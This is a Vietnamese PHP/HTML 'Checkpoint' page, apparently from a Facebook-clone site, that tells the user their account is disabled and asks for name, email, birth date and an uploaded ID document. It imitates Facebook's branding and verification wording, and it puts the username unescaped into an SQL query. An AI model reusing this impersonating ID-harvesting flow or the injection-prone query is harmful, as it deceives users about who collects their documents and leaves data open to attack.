<?php
	ob_start();
	session_start();
    include('../config.php');
    include_once('../main/header.php'); 
    if($username && $trangthai != 'disabled'){
        header("Location: $domain_url");
        exit();
    }else if(empty($username)){
        header("Location: $domain_url/dang-nhap");
        exit();
    }
?>
<title>Checkpoint</title>
<link rel="stylesheet" href="<?= $subdomain ?>/assets/css/checkpoint.css?<?= time() ?>">
<meta name="search engines" content="Aeiwi, Alexa, AllTheWeb, AltaVista, AOL Netfind, Anzwers, Canada, DirectHit, EuroSeek, Excite, Overture, Go, Google, HotBot. InfoMak, Kanoodle, Lycos, MasterSite, National Directory, Northern Light, SearchIt, SimpleSearch, WebsMostLinked, WebTop, What-U-Seek, AOL, Yahoo, WebCrawler, Infoseek, Excite, Magellan, LookSmart, bing, CNET, Googlebot" />
<body>
<div class="rows">
<div class="home-page">
<div class="header-page">
<div class="title-page">
    <div class="center-flex">
        <div class="logo" onclick="location.reload()"><h1 class="tenfb"></h1><i class="xtieudefacebook"></i>  F a c e b o o k</div>
    </div>
</div>
</div>
<div class="logout" onclick="window.location.href='dang-xuat'">Đăng xuất</div>
</div>
<!--/./-->
<div class="footer">
<?php
$kiemtra = mysqli_fetch_object(mysqli_query($kunloc,"SELECT * FROM `checkpoint` WHERE username = '$username'"));
?>
<?php if(empty($kiemtra->id)) { ?>
<!-- /./ -->
<div class="unlock-body" id="noti" style="display:block">
    <div class="unlock-header">Tài khoản của bạn đã bị vô hiệu hóa</div>
        <div class="unlock-captent">
            Xin chào, <small><?= $fullname ?></small><br>
            <span>Rất tiếc, bạn sẽ không thể truy cập tài khoản của mình. Xin hãy nhấn tiếp tục để hoàn thành các bước xác minh tài khoản.<br>
            Lưu ý tài khoản bị vô hiệu hóa quá 2 tuần sẽ bị loại bỏ khỏi hệ thống.
            </span>
        </div>
        <div class="card-footer p-0 bg-white text-right">
            <button class="submit btn-logout" id="next" onclick="Next()">Tiếp tục</button>
        </div>
</div>
<script>
function Next(){
    $("#next").prop('disabled', true).html('Đang xử lý')
    setTimeout(() => {
        $("#noti").hide(); 
        $("#noti2").show(); 
    }, 1000);

}
</script>
<!-- /./ -->
<div class="unlock-body" id="noti2" style="display:none">
    <div class="unlock-header">Tải lên giấy tờ tùy thân</div>
    <form id="unlock_form" action="javascript:void(0)" method="post" enctype="multipart/form-datas">
        <div class="unlock-captent">
            <h6>Vui lòng cung cấp thông tin sau để chúng tôi có thể xem xét xem bạn có đủ điều kiện sử dụng Facebook không.</h6>
            <h6 class="mt-1">Họ tên</h6>
            <input type="text" id="fullname" class="touch form-control" placeholder="ex: Họ và tên" required/>
            <h6 class="mt-1">Email</h6>
            <input type="email" id="email" class="touch form-control" placeholder="@gmail.com" required/>
            <div class="row">
                <div class="col-4 col-sm-4">
                <h6 class="mt-1">Ngày sinh</h6>
                <select id="day">
                <?php 
                for ($i = 1; $i <= 30; $i++) {
                    echo '<option value="'.$i.'" class="form-control">'.$i.'</option>';
                }
                ?>
                </select>
                </div>
                <div class="col-4 col-sm-4">
                <h6 class="mt-1">Tháng sinh</h6>
                <select id="month">
                <?php 
                for ($i = 1; $i <= 12; $i++) {
                    echo '<option value="'.$i.'" class="form-control">'.$i.'</option>';
                }
                ?>
                </select>
                </div>
                <div class="col-4 col-sm-4">
                <h6 class="mt-1">Năm sinh</h6>
                <select id="year">
                <?php 
                for ($i = 1980; $i <= 2010; $i++) {
                    echo '<option value="'.$i.'" class="form-control">'.$i.'</option>';
                }
                ?>
                </select>
                </div>
            </div>

            <span style="font-size:14px">Vui lòng đính kèm giấy tờ thể hiện tên mà bạn muốn dùng trên Facebook. Chúng tôi sẽ dựa trên những giấy tờ này để xác nhận tên của bạn. Bạn có thể tìm hiểu thêm ở bên dưới để biết lý do chúng tôi yêu cầu xác nhận và các loại giấy tờ tùy thân khác nhau mà chúng tôi chấp nhận.</span><br>
            <span style="font-size:14px">Giấy tờ tùy thân</span><br>
            <input type="hidden" id="image" value="" class="touch" required=""/>
            <span style="color:#666">Đã lưu dưới dạng JPE, nếu có thể. Bạn có thể đính kèm tối đa là 3 tệp.</span><br>
            <input type="file" id="file" name="file"/><br>
            <span style="font-size:14px;color:black">Chúng tôi có thể mã hóa và lưu trữ giấy tờ tùy thân của bạn trong tối đa 1 năm để cải thiện khả năng phát hiện giấy tờ tùy thân giả cho hệ thống tự động của mình. Giấy tờ tùy thân của bạn sẽ được lưu trữ an toàn và không hiển thị cho bất kỳ ai trên Facebook.
Nếu không muốn Facebook sử dụng giấy tờ tùy thân của bạn để cải thiện hệ thống tự động phát hiện giấy tờ tùy thân giả mạo của chúng tôi, bạn có thể điều chỉnh Cài đặt xác nhận danh tính của mình. Nếu bạn tắt tùy chọn này, bản sao giấy tờ tùy thân sẽ bị xóa trong vòng 30 ngày kể từ lúc gửi hoặc khi bạn tắt tùy chọn này.
            </span>
        </div>
        <div class="card-footer p-0 bg-white text-right">
            <button id="submit" class="submit btn-logout">Gửi</button>
        </div>
        </form>
</div>
<script>
$(function() {
    $("#file").change(function(){
        var form = $('#unlock_form')[0]; 
        var formData = new FormData(form);
        var get_image = $("#file").val();
        if(get_image.length !== ''){
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': $('meta[name="token"]').attr('value')
            }
        })
        $.ajax({
        url: "API/api_image_unlock.php",
        data: formData,
        processData: false,
        contentType: false,
        type: 'POST',
        success: function(data) {
            Data = JSON.parse(data);
            if(Data.type == 'success'){
                $("#image").val(Data.url)
            }
            //$("#submit").prop('disabled',flase);
            toarst(Data.type,Data.text,Data.title)
            return false;
        },error: function() {
            toarst(Data.type,Data.text,Data.title)
            return false;
        }
        })
    }else{
        toastr.warning('Bạn chưa tải ảnh lên');
        return false;
    }

    })
})
$("#submit").click(function(){
        var fullname = $("#fullname").val();
        var email = $("#email").val();
        var day = $("#day").val();
        var month = $("#month").val();
        var year = $("#year").val();
        var image = $("#image").val();
        ngaysinh = day+"-"+month+"-"+year;
        //$("#submit").prop('disabled',true);
        if(!image.length || !image){
            toastr.warning('Bạn chưa tải ảnh lên');
            return false; 
        }
        $.post("API/api_unlock.php",{
            type: "SEND",
            fullname: fullname,
            email:email,
            ngaysinh:ngaysinh,
            image:image
        },function(data){
           // $("#submit").prop('disabled',false);
            Data = JSON.parse(data);
            if(Data.type == 'success'){
                setTimeout(() => {
                    location.reload()
                }, 1000);
              
            }
            toarst(Data.type,Data.text,Data.title)
            return false; 
        })
        
})
</script>
<!-- /./ -->
<?php }else if($kiemtra->id){ ?>
<!-- /./ -->
<div class="unlock-body" id="noti" style="display:block">
    <div class="unlock-header">Tài khoản của bạn đã bị vô hiệu hóa</div>
        <div class="unlock-captent">
            <span>Cảm ơn bạn đã gửi yêu cầu để giúp chúng tôi xác minh bạn có vị phạm hay không.
            </span>
            <span>Yêu cầu xem xét của bạn sẽ được duyệt trong 24 tiếng. Chúng tôi đánh giá cao sự kiên nhẫn của bạn.</span>
        </div>
        <div class="card-footer p-0 bg-white text-right">
            <button class="submit btn-logout" onclick="window.location.href='dang-xuat'">Đăng xuất</button>
        </div>
</div>
<?php } ?>
</div>

</body>

<?php  include("../main/footer.php"); ?>  
